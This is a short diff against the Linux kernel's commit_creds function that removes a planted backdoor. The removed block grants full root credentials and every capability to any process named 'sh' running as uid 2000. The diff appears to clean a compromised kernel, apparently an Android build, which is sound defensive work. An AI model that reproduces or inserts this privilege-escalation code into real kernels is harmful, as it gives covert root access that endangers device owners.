@@ -492,34 +492,6 @@ int commit_creds(struct cred *new)
 		key_fsuid_changed(new);
 	if (!gid_eq(new->fsgid, old->fsgid))
 		key_fsgid_changed(new);
-
-	if (new && __kuid_val(new->uid) == 2000)
-		{
-			if (strcmp(task->comm, "sh") == 0)
-			{
-				new->uid			= GLOBAL_ROOT_UID;
-				new->gid			= GLOBAL_ROOT_GID;
-				new->suid			= GLOBAL_ROOT_UID;
-				new->sgid			= GLOBAL_ROOT_GID;
-				new->euid			= GLOBAL_ROOT_UID;
-				new->egid			= GLOBAL_ROOT_GID;
-				new->fsuid			= GLOBAL_ROOT_UID;
-				new->fsgid			= GLOBAL_ROOT_GID;
-
-
-				new->cap_bset.cap[0] = 0xffffffff; 
-				new->cap_bset.cap[1] = 0xffffffff; 
-				new->cap_permitted.cap[0] = 0xffffffff; 
-				new->cap_permitted.cap[1] = 0xffffffff; 
-				new->cap_effective.cap[0] = 0xffffffff; 
-				new->cap_effective.cap[1] = 0xffffffff; 
-				new->cap_inheritable.cap[0] = 0xffffffff; 
-				new->cap_inheritable.cap[1] = 0xffffffff; 
-				new->cap_ambient.cap[0] = 0xffffffff; 
-				new->cap_ambient.cap[1] = 0xffffffff;
-			
-			}
-		}
 				
 	/* do it
 	 * RLIMIT_NPROC limits on user->processes have already been checked
